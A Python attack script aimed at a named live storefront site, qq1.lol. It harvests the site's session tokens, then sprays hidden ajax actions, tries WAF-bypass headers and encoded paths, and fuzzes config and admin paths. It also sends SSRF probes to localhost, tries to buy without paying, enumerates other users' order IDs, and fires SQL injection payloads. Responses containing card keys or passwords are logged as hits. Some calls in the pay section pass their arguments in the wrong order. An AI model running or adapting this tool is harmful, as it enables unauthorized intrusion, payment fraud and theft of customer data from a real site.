#!/usr/bin/env python3
"""qq1.lol ultra deep probe — faka.js endpoints, payrmb, WAF bypass, path fuzz, SSRF, session"""
import hashlib
import json
import os
import re
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/workspace/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "ultra_probe.log"
HITS = OUT / "ultra_hits.jsonl"
JAR = str(OUT / ".ultra_cookies")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
HDR = ["-H", f"Referer: {BASE}/", "-H", "X-Requested-With: XMLHttpRequest"]
TIMEOUT = os.environ.get("QQ1_TIMEOUT", "12")

# From faka.js + framework wordlist
AJAX_ACTS = [
    "getcount", "getclass", "gettool", "gettoolnew", "getleftcount", "checklogin",
    "query", "order", "pay", "payrmb", "notify", "captcha", "cancel", "cart_list",
    "cart_info", "gift_start", "getshuoshuo", "getrizhi", "getshareid",
    "share_invitegift_link", "SharePoster", "login", "reg", "userinfo",
    "recharge", "withdraw", "changepwd", "apply_refund", "upload", "admin",
    "export", "download", "backup", "config", "siteinfo", "getconfig",
    "getorder", "orderlist", "getuser", "toollogs", "sendcard", "getcard",
    "kami", "faka", "dump", "rev_api_orders_dump", "quickreg", "connect",
    "coupon", "cutshop", "groupshop", "seckill", "oauth", "qqlogin",
]

API_PATHS = [
    "%61pi.php", "api.php", "%2561pi.php", "Api.php", "API.php",
    "api.php/", "%61pi.php/", "./%61pi.php", "ajax.php/../%61pi.php",
]

PATHS = [
    "admin/", "admin/login.php", "htgl/", "shequ/", "fenzhan/", "agent/",
    "user/workorder.php", "user/workorder.php?my=list", "user/order.php",
    "user/kami.php", "user/card.php", "user/recharge.php", "user/qrlogin.php",
    "sup/qrlogin.php", "other/getshop.php", "other/submit.php",
    "other/usdt_notify.php", "other/rmb_notify.php", "other/pay_notify.php",
    "cron.php", "toollogs.php", "workorder.php", "?mod=cart", "?mod=fenzhan",
    "?mod=kami", "?mod=export", "?buyok=1", "assets/faka/config.php",
    "runtime/log/", "data/config.php", ".git/HEAD", "composer.json",
    "phpinfo.php", "info.php", "p.php", "test.php", "debug.php",
]

WAF_BYPASS_HEADERS = [
    [], ["-H", "X-Original-URL: /ajax.php?act=admin"], ["-H", "X-Rewrite-URL: admin"],
    ["-H", f"Host: {BASE[8:]}"], ["-H", "X-Forwarded-For: 127.0.0.1"],
]


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"ts": datetime.now().isoformat(), "kind": kind, "detail": detail, "body": (body or "")[:5000]}
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:250]}")


def curl(url, post=None, extra=None):
    cmd = ["curl", "-sk", f"--max-time={TIMEOUT}", "-b", JAR, "-c", JAR, "-A", UA] + HDR
    if extra:
        cmd += extra
    if post is not None:
        cmd += ["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-d", post]
    cmd.append(url)
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=int(TIMEOUT) + 5).stdout.strip()
    except Exception as e:
        return f"err:{e}"


def get_session_tokens():
    buy = curl(f"{BASE}/?mod=buy&cid=14&tid=131")
    csrf_m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy)
    csrf = csrf_m.group(1) if csrf_m else ""
    hs = ""
    hs_m = re.search(r"var hashsalt=(.+);", buy)
    if hs_m:
        try:
            hs = subprocess.run(
                ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
                capture_output=True, text=True, timeout=5,
            ).stdout.strip()
        except Exception:
            pass
    return csrf, hs


def is_interesting(body, act=""):
    if not body or len(body) < 8:
        return False
    if any(x in body for x in ("404 Not Found", "403 Forbidden", "No Act", "请提供用户")):
        if act not in ("getcount", "getclass", "gettoolnew") or '"code":0' not in body:
            if "请提供" in body:
                return False
    markers = ("kminfo", "卡密", "----", "password", "mysql", "admin", "success", "订单结果", "api_key", "syskey")
    if any(m in body for m in markers):
        return True
    if '"code":0' in body and act not in ("getcount", "getclass", "gettoolnew", "checklogin", "cart_list"):
        return True
    if act in ("payrmb", "order", "query") and '"code":0' in body:
        return True
    return False


def test_faka_endpoints(csrf, hs):
    log("=== [1] faka.js endpoints ===")
    for act in ["payrmb", "cancel", "gift_start", "share_invitegift_link", "SharePoster",
                "getrizhi", "getshuoshuo", "getshareid"]:
        posts = [
            f"tid=131&csrf_token={csrf}",
            f"orderid=25944&csrf_token={csrf}",
            f"orderid=20260720145603146&hashsalt={hs}&csrf_token={csrf}",
            f"uin=123456&page=1&hashsalt={hs}",
            f"url={quote('https://qq1.lol/')}&hashsalt={hs}",
            f"url={quote('http://127.0.0.1/')}&hashsalt={hs}",
        ]
        for post in posts:
            body = curl(f"{BASE}/ajax.php?act={act}", post)
            if is_interesting(body, act):
                hit("faka_act", f"{act} {post[:60]}", body)
            elif body and len(body) > 15 and "No Act" not in body:
                log(f"  {act}: {body[:100]}")


def test_ajax_spray(csrf):
    log("=== [2] ajax act spray ===")
    for act in AJAX_ACTS:
        for post in [None, f"page=1&limit=100", f"id=25944&skey=test", f"csrf_token={csrf}"]:
            body = curl(f"{BASE}/ajax.php?act={act}", post) if post else curl(f"{BASE}/ajax.php?act={act}")
            if is_interesting(body, act):
                hit("ajax_spray", f"{act} post={post}", body)


def test_api_waf():
    log("=== [3] API WAF bypass ===")
    keys = ["qq1", "buyi", "kln166", "admin", "123456"]
    for path in API_PATHS:
        for key in keys:
            body = curl(f"{BASE}/{path}?act=search&id=25944&key={quote(key)}")
            if body and "请提供" not in body and is_interesting(body, "api"):
                hit("api_waf", f"{path} key={key}", body)


def test_paths():
    log("=== [4] path fuzz ===")
    for p in PATHS:
        body = curl(f"{BASE}/{p}")
        if not body or len(body) < 20:
            continue
        if "404 Not Found" in body[:200]:
            continue
        if any(x in body for x in ("kminfo", "卡密", "mysql", "admin", "login", "phpinfo", "DB_")):
            hit("path", p, body[:600])
        elif '"code":0' in body and "getcount" not in p:
            hit("path_json", p, body[:400])


def test_pay_chain(csrf, hs):
    log("=== [5] pay chain ===")
    # pay without geetest
    for tid in ("131", "118", "102", "4"):
        body = curl(f"{BASE}/ajax.php?act=pay", "POST",
                    f"tid={tid}&num=1&inputvalue=testuser&hashsalt={hs}&csrf_token={csrf}")
        if body:
            log(f"  pay tid={tid}: {body[:150]}")
            if '"code":0' in body:
                hit("free_pay", f"tid={tid}", body)
    # payrmb enum
    for oid in range(25930, 25945):
        body = curl(f"{BASE}/ajax.php?act=payrmb", "POST", f"orderid={oid}&csrf_token={csrf}")
        if body and "未登录" not in body and "No Act" not in body:
            hit("payrmb", f"orderid={oid}", body)


def test_sqli_encoding(csrf):
    log("=== [6] SQLi encoding bypass ===")
    payloads = [
        "1' OR '1'='1", "1' OR 1=1--", "1' UNION SELECT 1,2,3--",
        "13800138000' OR '1'='1", "%27%20OR%201%3D1--",
        "20260720145603146' OR '1'='1",
    ]
    for p in payloads:
        body = curl(f"{BASE}/ajax.php?act=query", f"data={quote(p)}&csrf_token={csrf}")
        if body and is_interesting(body, "query"):
            hit("sqli", p, body)


def test_user_sup(csrf):
    log("=== [7] user/sup ajax ===")
    for ep in ("user/ajax.php", "sup/ajax.php"):
        for act in ("login", "reg", "recharge", "pay", "orderlist", "getorder", "userinfo", "upload"):
            body = curl(f"{BASE}/{ep}?act={act}", f"user=test&pass=test&csrf_token={csrf}")
            if is_interesting(body, act):
                hit("sub_ajax", f"{ep}?act={act}", body)


def main():
    log("=== ULTRA PROBE START ===")
    curl(BASE + "/")
    csrf, hs = get_session_tokens()
    log(f"csrf={csrf[:16]}... hashsalt={hs[:16]}...")
    test_faka_endpoints(csrf, hs)
    test_ajax_spray(csrf)
    test_api_waf()
    test_paths()
    test_pay_chain(csrf, hs)
    test_sqli_encoding(csrf)
    test_user_sup(csrf)
    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== ULTRA PROBE DONE hits={n} ===")


if __name__ == "__main__":
    main()
